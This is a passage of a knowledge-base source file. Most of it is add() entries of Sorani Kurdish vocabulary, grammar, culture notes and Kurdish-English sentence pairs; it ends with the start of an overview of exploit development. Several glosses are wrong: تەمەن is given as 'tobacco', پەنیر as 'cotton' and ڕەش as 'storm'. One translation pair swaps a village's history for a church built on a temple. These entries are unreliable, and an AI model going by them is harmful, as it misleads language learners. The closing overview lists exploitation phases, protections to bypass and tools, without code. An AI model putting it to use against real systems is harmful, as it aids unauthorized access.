    'Sorani Kurdish science and academic vocabulary: SCIENCES: زانست (zanist — science), فیزیا (fîzya — physics), کیمیا (kîmya — chemistry), بایۆلۆژی (bayolojî — biology), بیرکاری (bîrkarî — mathematics), ئەندازیاری (andazyarî — engineering). NATURE: ئەتۆم (atom — atom), مۆلیکیول (molîkyûl — molecule), هێز (hêz — force/energy), لەشبیر (lashbîr — cell), جینۆم (jînom — genome). RESEARCH: توێژینەوە (twêzhînawa — research), تاقیکردنەوە (taqîkirdanawa — experiment), ئەنجام (anjam — result), تیۆری (tyorî — theory), ڕاپۆرت (râport — report). ACADEMIC: زانکۆ (zankô — university), کۆلێج (kolêj — college), بەش (bash — department), پرۆفیسۆر (profîsor — professor), خوێندکار (xwêndkâr — student), بڕوانامە (birwânama — diploma/degree).', 1.3)

  add('language', ['sorani medical terms', 'kurdish health vocabulary', 'sorani hospital words', 'وشەی پزیشکی'],
    'Sorani Kurdish medical and health vocabulary: GENERAL: پزیشک (pizîshk — doctor), نەخۆشخانە (naxoshxâna — hospital), دەرمانخانە (darmanxâna — pharmacy), نەشتەرگەری (nashtargarî — surgery), تەندروستی (tandirustî — health). BODY PARTS: سەر (sar — head), دەست (dast — hand), پا (pa — foot/leg), چاو (chaw — eye), گوێ (gwê — ear), دڵ (diḷ — heart), سنگ (sing — chest), زگ (zig — stomach). SYMPTOMS: ئازار (azar — pain), تا (ta — fever), سەرئێشە (sarêsha — headache), کۆخ (kox — cough), هاتنەوەی مل (hâtinaway mil — vomiting). TREATMENT: دەرمان (darman — medicine), دەرزی (darzî — injection), قورس (qurs — pill/tablet), نەخۆشی (naxoshî — illness/disease).', 1.3)

  // ── Kurdish Sorani — Law, Politics & Government ────────────────────────

  add('language', ['sorani legal terms', 'kurdish law vocabulary', 'sorani court language', 'وشەی یاسایی'],
    'Sorani Kurdish legal and judicial vocabulary: LEGAL SYSTEM: یاسا (yasa — law), دادگا (dadga — court), دادوەر (dadwar — judge), پارێزەر (parêzar — lawyer/attorney), بەڵگە (baḷga — evidence/document), ئاگاداری (agadarî — notification). CRIMES: تاوان (tawan — crime), دز (diz — theft), کوشتن (kushtin — murder), فێڵ (fêḷ — fraud). RIGHTS: مافی مرۆڤ (mafî mirov — human rights), ئازادی (azadî — freedom), دەنگدان (dangdan — voting), هەڵبژاردن (haḷbizhârdin — election), دەستوور (dastûr — constitution). PUNISHMENT: سزا (siza — punishment), زیندان (zîndan — prison), بڕیار (biryar — verdict/decision).', 1.3)

  add('language', ['sorani political vocabulary', 'kurdish government terms', 'sorani parliament words', 'وشەی سیاسی'],
    'Sorani Kurdish political and government vocabulary: GOVERNMENT: حکومەت (ḥikûmat — government), پەرلەمان (parlaman — parliament), وەزیر (wazîr — minister), سەرۆک (sarôk — president/leader), وەزارەت (wazarat — ministry). POLITICAL TERMS: سیاسەت (syasat — politics), پارت (part — party), دیمۆکراسی (dîmokrasî — democracy), هەڵبژاردن (haḷbizhârdin — election), ئۆپۆزسیۆن (opozîsyon — opposition), کۆمار (komar — republic). KURDISH-SPECIFIC: هەرێمی کوردستان (harêmî kurdistân — Kurdistan Region), پێشمەرگە (pêshmerga — Kurdish military forces, lit. "those who face death"), فیدرالی (fîdrâlî — federal).', 1.3)

  // ── Kurdish Sorani — Education & Learning ──────────────────────────────

  add('language', ['sorani education vocabulary', 'kurdish school terms', 'sorani learning words', 'وشەی پەروەردە'],
    'Sorani Kurdish education and school vocabulary: LEVELS: قوتابخانە (qutabxâna — school), ئامادەیی (amadayî — high school), زانکۆ (zankô — university), ماستەر (mâstar — master\'s), دکتۆرا (diktora — doctorate). SUBJECTS: بیرکاری (bîrkarî — math), زمان (ziman — language), مێژوو (mêzhû — history), جوگرافیا (jugrafya — geography), وەرزش (warzish — sports), هونەر (hunar — art). SCHOOL LIFE: قوتابی (qutabî — student), مامۆستا (mamosta — teacher), وانە (wâna — lesson), تاقیکردنەوە (taqîkirdanawa — exam), نمرە (nimra — grade/mark), باڵاخانە (bâḷaxâna — classroom), کتێبخانە (ktêbxâna — library). ACTIONS: خوێندن (xwêndin — to study/read), نووسین (nûsîn — to write), فێربوون (fêrbûn — to learn).', 1.3)

  // ── Kurdish Sorani — Agriculture & Rural Life ──────────────────────────

  add('language', ['sorani agriculture vocabulary', 'kurdish farming terms', 'sorani rural vocabulary', 'وشەی کشتوکاڵ'],
    'Sorani Kurdish agriculture and rural life vocabulary: FARMING: کشتوکاڵ (kishtukâḷ — agriculture), جوتیار (jutyar — farmer), کێڵگە (kêḷga — farm/field), چاندن (chândin — to plant/sow), دروێنە (dirwêna — harvest). CROPS: گەنم (ganim — wheat), برنج (birinj — rice), جۆ (jo — barley), تەمەن (taman — tobacco), پەنیر (panîr — cotton). ANIMALS: مانگا (manga — cow), مەڕ (maṛ — sheep), بزن (bizin — goat), ئەسپ (asp — horse), کەر (kar — donkey), مریشک (mirishk — chicken). TOOLS: جوت (jut — plow), داس (das — sickle), بێر (bêr — spade), تەور (tawr — axe). SEASONS: بەهار (bahâr — spring), هاوین (hâwîn — summer), پاییز (payîz — autumn), زستان (zistân — winter).', 1.3)

  // ── Kurdish Sorani — Commerce & Economy ────────────────────────────────

  add('language', ['sorani commerce vocabulary', 'kurdish business terms', 'sorani economy words', 'وشەی بازرگانی'],
    'Sorani Kurdish commerce and economy vocabulary: BUSINESS: بازرگانی (bazirganî — commerce/trade), کۆمپانیا (kompanya — company), بانک (bank — bank), سەرمایە (sarmaya — capital), قازانج (qazanj — profit), زەرەر (zarar — loss). MONEY: پارە (para — money), دینار (dînar — dinar, Iraqi currency), دۆلار (dolâr — dollar), نرخ (nirx — price), داهات (dahat — income), خەرجی (xarjî — expense). TRADE: فرۆشتن (froshtin — to sell), کڕین (kiṛîn — to buy), هەناردە (hanarda — export), هاوردە (hâwirda — import), بازاڕ (bazâṛ — market/bazaar). EMPLOYMENT: کار (kar — work/job), مووچە (mûcha — salary), داماوی (damawî — vacation), خانەنشینی (xânanishînî — retirement).', 1.3)

  // ── Kurdish Sorani — Literature & Folklore ─────────────────────────────

  add('language', ['sorani modern literature', 'kurdish contemporary writers', 'sorani literary movements', 'ئەدەبی مۆدێرن'],
    'Sorani Kurdish modern literature and literary movements: PIONEERS: شێرکۆ بێکەس (Sherko Bekas, 1940-2013) — greatest modern Kurdish poet, pioneer of free verse. عبدالله پەشێو (Abdullah Pashew, b. 1946) — "poet of love and homeland." بەختیار عەلی (Bakhtiar Ali, b. 1966) — leading Kurdish novelist. MOVEMENTS: ڕۆمانتیزم (romantîzm) in 1940s-50s, ڕیالیزم (ryalîzm) in 1960s-70s, مۆدێرنیزم (modêrnîzm) from 1980s. GENRES: شیعر (shiʿir — poetry), ڕۆمان (roman — novel), چیرۆک (chîrok — short story), شانۆ (shano — theater/drama), وتار (witar — essay). THEMES: ئازادی (azadî — freedom), نیشتمانپەروەری (nishtimânparwarî — patriotism), کۆچبەری (kochbarî — exile/diaspora).', 1.3)

  add('language', ['sorani folk tales', 'kurdish mythology stories', 'sorani oral tradition', 'چیرۆکی گەلی'],
    'Sorani Kurdish folk tales and oral tradition: FAMOUS TALES: مەم و زین (Mam û Zîn — Kurdish Romeo & Juliet, by Ahmad Khani, 1695), خەجە و سیامەند (Xaja û Syamand — tragic love story), زەمبیلفرۆش (zambîlfrosh — the basket seller). MYTHICAL FIGURES: کاوە ئاسنگەر (Kawa Asinagar — Kawa the Blacksmith, who defeated the tyrant Zahhak), ڕووستەم (Rûstam — hero from Shahnameh). STORY TYPES: چیرۆکی پەریان (chîrokî paryan — fairy tales), ئەفسانە (afsâna — legend/myth), مەتەڵ (mataḷ — fable/parable), گێڕانەوە (gêrranawa — narrative). STORYTELLING: چیرۆکبێژ (chîrokbêzh — storyteller), tradition of evening storytelling (شەوانە — shawâna).', 1.3)

  // ── Kurdish Sorani — Music & Arts ──────────────────────────────────────

  add('language', ['sorani music vocabulary', 'kurdish musical terms', 'sorani songs and instruments', 'مۆسیقا'],
    'Sorani Kurdish music and musical vocabulary: INSTRUMENTS: تەنبوور (tanbûr — long-necked lute, central to Kurdish music), دەف (daf — frame drum), زورنا (zurna — double-reed instrument), دووزەلە (dûzala — double-flute), کەمانچە (kamâncha — bowed string). GENRES: گۆرانی (goranî — song), هەورامی (hawramî — Hawrami modal music), مەقام (maqam — modal system), لاوک (lawk — folk song), حەیران (ḥayrân — love song). ARTISTS: ناسر ڕەزازی (Nasir Razazi), حەسەن زیرەک (Hasan Zirak, "King of Kurdish Music"), شاهرام ناظری (Shahram Nazeri). EVENTS: دایرە (dayra — musical circle), هەڵپەڕکێ (haḷparkê — Kurdish dance, line dancing). MUSIC TERMS: دەنگ (dang — voice/tone), ئاواز (awaz — melody/song), ڕیتم (rîtm — rhythm).', 1.3)

  // ── Kurdish Sorani — Media & Journalism ────────────────────────────────

  add('language', ['sorani media vocabulary', 'kurdish journalism terms', 'sorani news language', 'وشەی میدیا'],
    'Sorani Kurdish media and journalism vocabulary: MEDIA TYPES: ڕۆژنامە (rozhnâma — newspaper), گۆڤار (govâr — magazine), ڕادیۆ (râdyo — radio), تەلەڤزیۆن (talafizyon — television), میدیای دیجیتاڵ (mîdyay dîjîtâḷ — digital media). JOURNALISM: ڕۆژنامەوانی (rozhnâmawânî — journalism), وەرگێڕ (wargêṛ — translator), پەیامنێر (payâmnêr — reporter/correspondent), هەواڵ (hawâḷ — news), چاوپێکەوتن (châwpêkawtin — interview). CONTENT: بابەت (bâbat — topic/article), سەرنووس (sarnûs — headline), لێدوان (lêdwan — comment/statement), ڕاپرسی (rapsî — survey/poll). KEY OUTLETS: Kurdistan24, Rudaw, NRT — major Kurdish news networks. کوردسات (Kurdsat) — pioneering Kurdish satellite TV.', 1.2)

  // ── Kurdish Sorani — Complex Grammar Constructions ─────────────────────

  add('language', ['sorani relative clauses', 'kurdish relative pronoun', 'sorani subordinate clauses', 'ڕستەی لاوەکی'],
    'Sorani Kurdish relative clauses and subordinate constructions: RELATIVE MARKER: کە (ka — that/which/who) is the universal relativizer. EXAMPLES: پیاوەکەی کە هات (pyawakay ka hat — the man who came), کتێبەکەی کە خوێندمەوە (ktêbakay ka xwêndimawa — the book that I read). HEADLESS RELATIVES: ئەوەی کە دەزانم (away ka dazanim — that which I know). CORRELATIVE: هەر ... کە (har ... ka — whoever/whatever). TEMPORAL CLAUSES: کاتێک کە (katêk ka — when), پێش ئەوەی کە (pêsh away ka — before), دوای ئەوەی کە (dway away ka — after). CAUSAL: چونکە (chûnka — because), لەبەر ئەوەی (labar away — because of). CONCESSIVE: هەرچەندە (harchanda — although).', 1.3)

  add('language', ['sorani reported speech', 'kurdish indirect speech', 'sorani quotation grammar', 'قسەی ناڕاستەوخۆ'],
    'Sorani Kurdish reported speech and quotation: DIRECT SPEECH uses وت/گوتی (wit/gutî — said): ئەو وتی "من دێم" (aw witî "min dêm" — He said "I am coming"). INDIRECT SPEECH uses کە (ka): ئەو وتی کە دێت (aw witî ka dêt — He said that he is coming). TENSE BACKSHIFT: present → past in indirect: "دەچم" → وتی کە دەچوو ("dachim" → witî ka dachû). REPORTING VERBS: وتن (witin — to say), پرسین (pirsîn — to ask), باسکردن (bâskirdin — to mention), وەڵامدانەوە (waḷâmdânawa — to reply). EMBEDDED QUESTIONS: پرسی کە کەی دێت (pirsî ka kay dêt — asked when [he] comes).', 1.3)

  add('language', ['sorani subjunctive mood', 'kurdish subjunctive verb', 'sorani optative mood', 'بابەتی ئارەزوومەندی'],
    'Sorani Kurdish subjunctive and optative moods: SUBJUNCTIVE FORMATION: prefix بـ (bi-) + present stem. USAGE: wishes (خوا بیەوێت — xwa biyawêt — God willing), requests (تکایە بیخوێنەوە — tikaya bixwênawa — Please read it), purpose clauses (بۆ ئەوەی بزانێت — bo away bizanêt — so that he knows). OPTATIVE: expresses wishes — بخوازم (bixwazim — I wish). AFTER MODAL VERBS: دەتوانم بچم (datwânim bichim — I can go), دەبێت بچیت (dabêt bichît — you must go). NEGATIVE SUBJUNCTIVE: نە + بـ → نەبچیت (nabichît — don\'t go). CONTRAST WITH INDICATIVE: دەچم (dachim — I go, indicative) vs بچم (bichim — that I go, subjunctive).', 1.3)

  // ── Kurdish Sorani — Kurdish History & Geography ───────────────────────

  add('language', ['sorani kurdish history', 'kurdistan history overview', 'kurdish people history', 'مێژووی کورد'],
    'Kurdish history overview (مێژووی کورد — mêzhûy kurd): ANCIENT: Kurds are descendants of ancient Iranian peoples (Medes, 7th century BC). MEDIEVAL: Saladin (سەلاحەدین — Salaḥaddîn, 1137-1193), the great Kurdish sultan who founded the Ayyubid dynasty. Kurdish emirates (مـیرنشین — mîrnishîn) existed semi-autonomously for centuries. 1514: Battle of Chaldiran divided Kurdistan between Ottoman and Safavid empires. MODERN: 1920 Treaty of Sèvres promised Kurdish state (never implemented). 1946: Republic of Mahabad — short-lived Kurdish state in Iran. 1991: Kurdish uprising in Iraq → autonomy. 2003: Iraq War → Kurdistan Regional Government strengthened. Anfal genocide (1986-1989) and Halabja chemical attack (1988) are defining tragedies.', 1.4)

  add('language', ['sorani kurdistan geography', 'kurdish homeland regions', 'sorani geography terms', 'جوگرافیای کوردستان'],
    'Kurdistan geography (جوگرافیای کوردستان — jugrafyay kurdistân): Kurdistan spans parts of Iraq, Turkey, Iran, and Syria — approximately 500,000 km². IRAQI KURDISTAN: هەولێر (Hawlêr/Erbil — capital), سلێمانی (Silêmânî/Sulaymaniyah — cultural capital), دهۆک (Duhok), هەڵەبجە (Halabja), کەرکووک (Kirkuk — disputed). MOUNTAINS: زاگرۆس (Zagros range), قەندیل (Qandîl), ساکۆ (Sako), حاجی ئۆمەران (Haji Omaran — highest point ~3600m). RIVERS: زێی گەورە (Zêy Gawra/Greater Zab), زێی بچووک (Zêy Bichûk/Lesser Zab), سیروان (Sîrwân/Diyala). LAKES: دوکان (Dukan — reservoir), دەربەندیخان (Darbandîxan). CLIMATE: continental, hot summers, cold winters with heavy mountain snowfall.', 1.3)

  // ── Kurdish Sorani — Kurdish Cultural Practices ────────────────────────

  add('language', ['sorani newroz celebration', 'kurdish new year festival', 'sorani cultural festivals', 'نەورۆز'],
    'Kurdish cultural festivals and celebrations: NEWROZ (نەورۆز — nawroz — Kurdish New Year, March 21): Most important Kurdish holiday. Celebrates spring equinox. Connected to Kawa the Blacksmith legend — symbolizes Kurdish resistance. Activities: lighting bonfires (ئاگر — agir), wearing traditional clothes (جل و بەرگی کوردی), dancing (هەڵپەڕکێ), picnics in nature. RAMADAN (ڕەمەزان): observed by Muslim Kurds. EID: جەژنی ڕەمەزان (jazhni ramazan — Eid al-Fitr), جەژنی قوربان (jazhni qurban — Eid al-Adha). WEDDING: (شای — shay) — multi-day celebrations with music, dance, elaborate ceremonies. هەڵپەڕکێ دەبن (haḷparkê dabin — they do Kurdish dance). MOURNING: سەرەخۆشی (saraxoshî — condolence visits).', 1.3)

  add('language', ['sorani traditional clothing', 'kurdish national dress', 'sorani cultural dress', 'جل و بەرگی کوردی'],
    'Sorani Kurdish traditional clothing (جل و بەرگی کوردی — jil û bargî kurdî): MEN\'S CLOTHING: شەرواڵ (sharwâḷ — baggy trousers), ڕانک (rânk — vest/jacket), چاکەت (châkat — jacket), پشتێن (pishtên — waistcoat), کەلاوی کوردی (kalawî kurdî — Kurdish turban), شاڵ (shâḷ — sash/cummerbund). WOMEN\'S CLOTHING: فستان (fistan — traditional dress, often colorful), کراس (kras — blouse), شاڵوار (shâḷwâr — trousers), پشتێنی ژنان (pishtênî zhinân — women\'s vest), sequined and embroidered fabrics. REGIONAL VARIATION: each region has distinct patterns and colors. OCCASIONS: traditional clothing worn especially for Newroz, weddings, and cultural events.', 1.2)

  // ── Kurdish Sorani — Transportation & Directions ───────────────────────

  add('language', ['sorani transportation words', 'kurdish direction vocabulary', 'sorani travel phrases', 'وشەی هاتووچۆ'],
    'Sorani Kurdish transportation and directions vocabulary: VEHICLES: ئۆتۆمبێل (otombêl — car), پاس (pâs — bus), تەیارە (tayâra — airplane), قطار (qitâr — train), کەشتی (kashtî — ship), دووچەرخە (dûcharxa — bicycle), تەکسی (taksî — taxi). DIRECTIONS: ڕاست (râst — right), چەپ (chap — left), ڕاستەوخۆ (râstawxo — straight), پاشەوە (pâshawa — back), پێشەوە (pêshawa — forward). ASKING DIRECTIONS: ببوورە، ڕێگای ... لەکوێیە؟ (bibûra, rêgay ... lakwêya? — Excuse me, where is the way to...?), لێرەوە دوورە؟ (lêrawa dûra? — Is it far from here?). PLACES: وێستگە (wêstga — station), فڕۆکەخانە (fṛokaxâna — airport), گەراج (garâj — garage/bus station).', 1.3)

  // ── Kurdish Sorani — Weather & Nature Extended ─────────────────────────

  add('language', ['sorani weather expressions', 'kurdish weather phrases', 'sorani climate vocabulary', 'وشەی کەشوهەوا'],
    'Sorani Kurdish weather and climate expressions: WEATHER: کەشوهەوا (kashuhawa — weather/climate), هەتاو (hataw — sun), بارانی (barânî — rainy), بەفر (bafr — snow), با (ba — wind), هەور (hawr — cloud), ڕەش (rash — storm). EXPRESSIONS: ئەمڕۆ هەوا گەرمە (amṛo hawa garma — Today is hot), سەرما خواردووم (sarma xwardûm — I caught a cold, lit. I ate the cold), باران دەبارێت (baran dabârêt — It is raining), بەفر دەبارێت (bafir dabârêt — It is snowing). SEASONS IN DETAIL: بەهاری کوردستان (baharî kurdistân — spring in Kurdistan) is celebrated. NATURAL PHENOMENA: تەرمیک (tarmîk — earthquake), لافاو (lafaw — flood), وشکەساڵی (wishkasaḷî — drought). KURDISH SAYING: "باران بەرەکەتە" (baran barakata — Rain is blessing).', 1.3)

  // ── Kurdish Sorani — Sports & Recreation ───────────────────────────────

  add('language', ['sorani sports vocabulary', 'kurdish athletic terms', 'sorani game words', 'وشەی وەرزشی'],
    'Sorani Kurdish sports and recreation vocabulary: SPORTS: وەرزش (warzish — sport), تۆپی پێ (topî pê — football/soccer), باسکەتبۆڵ (bâskatboḷ — basketball), فۆلیبۆڵ (folîboḷ — volleyball), مەلەوانی (malawânî — swimming), بۆکس (boks — boxing). FOOTBALL: یاری (yarî — game/match), تاکە (tâka — goal), داوەر (dâwar — referee), تیم (tîm — team), یاریزان (yarîzan — player), وەرزشگا (warzishga — stadium). TRADITIONAL: زۆرخانە (zorxâna — traditional gymnasium), گوڵەبازی (gullabazî — wrestling), ئەسپ سواری (asp swârî — horse riding). RECREATION: پیاسە (pyâsa — stroll/walk), پارکی گەشتیاری (parkî gashtiyarî — tourist park), چیابانی (chyabânî — mountain hiking).', 1.2)

  // ── Kurdish Sorani — Religion & Spirituality ───────────────────────────

  add('language', ['sorani religion vocabulary', 'kurdish spiritual terms', 'sorani faith words', 'وشەی ئایینی'],
    'Sorani Kurdish religion and spirituality vocabulary: ISLAM (majority): مزگەوت (mizgawt — mosque), نوێژ (nwêzh — prayer), ڕۆژوو (rozhû — fasting), حەج (ḥaj — pilgrimage), قورئان (qur\'ân — Quran), مەلا (malla — cleric/imam). OTHER FAITHS: ئێزیدی (êzîdî — Yazidi, ancient Kurdish religion), لالش (Lalish — Yazidi holy temple), کاکەیی (kakayî — Yarsanism/Ahl-e Haqq), مەسیحی (masîḥî — Christian), کەلیسا (kalîsa — church). CONCEPTS: خوا/خودا (xwa/xuda — God), باوەڕ (bâwaṛ — faith/belief), ڕووح (rûḥ — soul/spirit), بەهەشت (bahesht — paradise), دۆزەخ (dozax — hell). KURDISH SAYING: "خوا گەورەیە" (xwa gawraya — God is great).', 1.2)

  // ── Kurdish Sorani — CKB-ENG Translation Corpus ───────────────────────
  // Sourced from KurdishBLARK/InterdialectCorpus CKB-ENG parallel dataset
  // https://github.com/KurdishBLARK/InterdialectCorpus/tree/master/CKB-ENG

  add('language', ['sorani english translation', 'kurdish english parallel', 'translate kurdish english', 'kurdish translation corpus', 'ckb eng corpus', 'وەرگێڕانی کوردی ئینگلیزی'],
    'The Kurdish Sorani – English translation corpus (CKB-ENG) from KurdishBLARK contains 649 aligned parallel sentences. A curated subset of 53+ sentence pairs is available here for language learning, organized into 11 categories: culture & festivals, language rights & education, history & heritage, film & arts, society & civil life, human rights, health & pandemic, news headlines, inspirational expressions, legal & political terms, and key vocabulary. Full dataset: https://github.com/KurdishBLARK/InterdialectCorpus/tree/master/CKB-ENG. Example: "بوونی ئێوە خۆی لە خۆیدا سەرکەوتنە" → "Your presence alone is a victory." The corpus demonstrates Kurdish Sorani sentence structure (SOV) mapped to English (SVO) with natural phrasing.', 1.4)

  add('language', ['sorani translation culture', 'kurdish culture translation', 'translate kurdish culture', 'فەرهەنگی کوردی'],
    'Kurdish Sorani – English cultural translations from CKB-ENG corpus: "هەفتەی کولتووری کوردی لە شاری بڕۆسکلی پایتەختی بەلجیکا" → "The Kurdish Culture Week in Brussels, the capital of Belgium." | "لە قامشلۆ نەورۆز پیرۆزکرا" → "Newroz celebrated in Qamislo." | "گۆرانی سۆرانی دەچڕدرێت و گۆڤەند و هەڵپەڕکێ دەگیردرێت" → "Songs in the Sorani dialect and dances." | "ئاوازی چیا تیپی مۆسیقای گەریلا کلیپێکی بۆ گۆرانییەکی نوێ ئامادە کرد" → "Awazê Çiya music band released a new song." Key cultural vocabulary: کولتوور (kultûr — culture), فێستیڤاڵ (fêstîval — festival), گۆرانی (goranî — song), هەڵپەڕکێ (halpaṛkê — dance).', 1.3)

  add('language', ['sorani translation education', 'kurdish education translation', 'translate kurdish education', 'sorani language rights translation', 'زمانی دایکی'],
    'Kurdish Sorani – English education & language rights translations from CKB-ENG corpus: "لە کۆی 200 وڵاتی جیهان، ئێران لەو دەگمەن وڵاتانەیە کە خوێندن و فێربوونی زمانی دایکیی تێیدا ڕێگەپێنەدراوە" → "Among 200 countries, Iran is one of the few in which reading and learning in mother language is prohibited." | "کوشتنی زمانی دایکیی هەمان ڕەگەزپەرەستی و پاکتاوی نژادییە" → "Killing a mother tongue is the same as racism and ethnic cleansing." | "کۆمەڵگە بەزمانی خۆی بوونی خۆی بەردەوام دەکات" → "Societies continue their existence with their languages." Key vocabulary: فێرکاری (fêrkarî — education), زمان (zman — language), خوێندن (xwêndin — studying).', 1.3)

add('language', ['sorani translation history', 'kurdish history translation', 'translate kurdish history', 'مێژووی کوردی'],
    'Kurdish Sorani – English history translations from CKB-ENG corpus: "گوندی حاجیکاش شوێنی ژیانی هاوبەشی کورد و ئەرمەن بوو" → "Kurds and Armenians lived together in the village of Hacıkaş." | "ئەو گوندە 3 جار لەلایەن دەوڵەتی تورکیاوە سوتێنرا" → "The village was burnt down three times by the Turkish state." | "مێژووی ئەو گوندە دەگەڕێتەوە بۆ 3 هەزار ساڵ" → "This church was built on the site of a 3 thousand years old temple." Key vocabulary: مێژوو (mêzhû — history), گوند (gund — village), کەلەپوور (kalapûr — heritage).', 1.3)

  add('language', ['sorani translation film', 'kurdish film translation', 'translate kurdish cinema', 'sorani arts translation', 'فیلمی کوردی'],
    'Kurdish Sorani – English film & arts translations from CKB-ENG corpus: "فیلمی کچانی ڕۆژ باس لە تێکۆشانی ژنانی کورد دەکات" → "The Girls of the Sun film is about the Kurdish women\'s fight." | "فیلمی بۆ ئازادی لە ناوەندی کلتور و هونەری محەمەد شێخۆ نمایشکرا" → "The film Ji Bo Azadiyê was screened at the Mihemed Şêxo Culture and Art Center." | "150 دەزگای چاپ بە دەیان هەزار کتێبەوە بەشدارییان لە پێشانگاکەدا کرد" → "150 publishers are participating in the fair with tens of thousands of books." Key vocabulary: فیلم (fîlm — film), هونەر (hunar — art), کتێب (ktêb — book), نمایش (nimayish — screening).', 1.3)

  add('language', ['sorani translation health', 'kurdish health translation', 'translate kurdish medical', 'sorani pandemic translation', 'تەندروستی'],
    'Kurdish Sorani – English health & pandemic translations from CKB-ENG corpus: "ئەو پەتایە بەسەر هەموو جیهاندا بڵاوبووەتەوە" → "The Covid-19 pandemic has spread around the world." | "ئێمە نە نەخۆشخانەمان هەیە و نە دکتۆرمان" → "We have neither hospital nor doctors." | "ئەگەر ڤایرۆسی کۆرۆنا بگاتەمان، ئاکامەکان لێرەسەن دەبن" → "If the coronavirus outbreak reaches us, the consequences will be devastating." | "هیڤا سۆر نەخۆشخانەیەکی 120 جێگەی دامەزراند" → "Heyva Sor established a 120-bed hospital." Key vocabulary: نەخۆشخانە (nexoshxane — hospital), دکتۆر (dktor — doctor), پەتا (pata — pandemic).', 1.3)

  add('language', ['sorani translation human rights', 'kurdish human rights translation', 'translate kurdish rights', 'مافی مرۆڤ'],
    'Kurdish Sorani – English human rights translations from CKB-ENG corpus: "یەک لە سێ ژنانی جیهان تووشی توندوتیژی بووە" → "One in three women worldwide has been subjected to violence." | "یەک ملیارد ژنی سەرتاسەری جیهان تووشی دەستدرێژی بووە" → "One billion women worldwide have been raped or harassed." | "ژنان ئامادە نین ئەم توندوتیژییە بەئاسایی بپەسێنن" → "Women refuse to assume passively this violence." Key vocabulary: مافی مرۆڤ (mafî mirov — human rights), ئازادی (azadî — freedom), دادوەری (dadwerî — justice), توندوتیژی (tundutîzhî — violence).', 1.3)

  add('language', ['sorani translation legal', 'kurdish legal translation', 'translate kurdish political', 'sorani political vocabulary', 'یاسایی و سیاسی'],
    'Kurdish Sorani – English legal & political translations from CKB-ENG corpus: "لقی دووەمی دادگای ئینقلابی کرماشان حوکمی 9 مانگ زیندانی سەپاند" → "The Second Branch of the Kermanshah Revolutionary Court sentenced to 9 months prison." | "ئەو 4 چالاکوانە فەرهەنگییانە بە کەفاڵەت ئازادکران" → "These four cultural activists were released on bail." | "دوو هاووڵاتی لە پیرانشار دەسبەسەر کران" → "Two Kurdish citizens arrested in Piranshahr." Key vocabulary: دادگا (dadga — court), حوکم (ḥukm — verdict/sentence), زیندان (zindan — prison), چالاکوان (çalakwan — activist), کەفاڵەت (kafâlat — bail).', 1.3)

  add('language', ['sorani translation news', 'kurdish news translation', 'translate kurdish headlines', 'سەرخێنی هەواڵ'],
    'Kurdish Sorani – English news headline translations from CKB-ENG corpus: "بوومەلەرزەیەک بە ئاستی 4 ڕوویدا" → "A 4.0 magnitude earthquake occurred." | "هێزەکانی ئەمنیی ناوخۆ ئۆپەراسیۆنێکیان ئەنجامدا" → "Internal Security Forces launched an operation." | "لە هێرشەکەدا تەلەفاتی گیانی نەبوو" → "There was no loss of life in the attack." Kurdish news vocabulary: هەواڵ (hawal — news), بوومەلەرزە (bûmalarza — earthquake), هێرش (hêrish — attack), ئۆپەراسیۆن (operasyôn — operation), ئەمنیی ناوخۆ (amnîy nawxo — internal security).', 1.3)

  add('language', ['sorani translation sentences', 'kurdish sentence examples', 'sorani english sentence pairs', 'kurdish parallel sentences', 'نموونەی ڕستە'],
    'Kurdish Sorani – English parallel sentence examples from CKB-ENG corpus (KurdishBLARK): INSPIRATIONAL: "بوونی ئێوە خۆی لە خۆیدا سەرکەوتنە" → "Your presence alone is a victory." | "شەڕکردن سەرکەوتنە" → "Fighting is a victory." | "تاکە شتێک کە ئەوان دەیکوژن، ترسی ئێمەیە" → "All they have killed is our fear." | "لە جێگەی هەر ژنێک کە ئێوە دەڕفێنن، شەڕڤانێکی نوێ دروست دەبێت" → "With each sister who was captured, a warrior was born." EDUCATION: "ئێمە بەم زمانە هەڵبەستمان خویندووەتەوە و وتەی خۆشمان بیستووە" → "We read our first poem and voiced our first beautiful saying in Kurdish." SOCIETY: "کۆمەڵگایەک کە تاکە یەک زمان بە سەر زمانەکانی دیکەدا دەسەپێنیت، کۆمەڵگەیەکی ڕەگەزپەرەستە" → "A society that imposes only one language over other languages is a racist society."', 1.3)

  add('language', ['sorani corpus vocabulary', 'kurdish english vocabulary corpus', 'ckb eng vocabulary', 'sorani key words translation', 'وشەی سەرەکی'],
    'Key Kurdish Sorani – English vocabulary from the CKB-ENG parallel corpus: CITIZEN & STATE: هاووڵاتی (hawlatî — citizen), دەوڵەت (dawlat — state/government), حکوومەت (ḥikûmat — government). LANGUAGE & EDUCATION: زمان (zman — language), زمانی دایکی (zmanî dayikî — mother tongue), فێرکاری (fêrkarî — education), قوتابخانە (qutabxane — school), مامۆستا (mamosta — teacher), خوێندن (xwêndin — studying). CULTURE & ARTS: فیلم (fîlm — film), گۆرانی (goranî — song), هونەر (hunar — art), کتێب (ktêb — book), فێستیڤاڵ (fêstîval — festival), کولتوور (kultûr — culture), فەرهەنگ (farhang — culture/dictionary). RIGHTS & JUSTICE: مافی مرۆڤ (mafî mirov — human rights), ئازادی (azadî — freedom), دادوەری (dadwerî — justice), زیندان (zindan — prison). HEALTH: نەخۆشخانە (nexoshxane — hospital), دکتۆر (dktor — doctor), تەندروستی (tandirustî — health), پەتا (pata — pandemic). GEOGRAPHY: گوند (gund — village), شار (shar — city), وڵات (wilat — country).', 1.3)

  // ═══════════════════════════════════════════════════════════════════════════════
  // §  EXPLOIT DEVELOPMENT — Offensive security techniques & vulnerability research
  // ═══════════════════════════════════════════════════════════════════════════════

  add('exploit_development', ['exploit development', 'exploit dev', 'vulnerability research', 'offensive security', 'binary exploitation', 'pwn', 'exploit writing'],
    'Exploit development is the process of discovering vulnerabilities in software and writing code (exploits) to leverage those flaws for unauthorized access or control. KEY PHASES: 1) RECONNAISSANCE — identify target software, version, architecture (x86, x64, ARM). 2) VULNERABILITY DISCOVERY — fuzzing, code audit, reverse engineering to find bugs (buffer overflows, format strings, use-after-free, integer overflows). 3) EXPLOIT WRITING — craft input that triggers the bug and redirects execution (shellcode, ROP chains, ret2libc). 4) PAYLOAD DELIVERY — encode shellcode to bypass filters, avoid bad characters, evade ASLR/DEP/NX/CFI. 5) POST-EXPLOITATION — maintain access, privilege escalation. TOOLS: pwntools (Python exploit framework), GDB + pwndbg/GEF (debugging), Ghidra/IDA Pro (disassembly), radare2/rizin (binary analysis), ROPgadget/ropper (gadget finding), checksec (binary protections check), objdump/readelf (ELF analysis), strace/ltrace 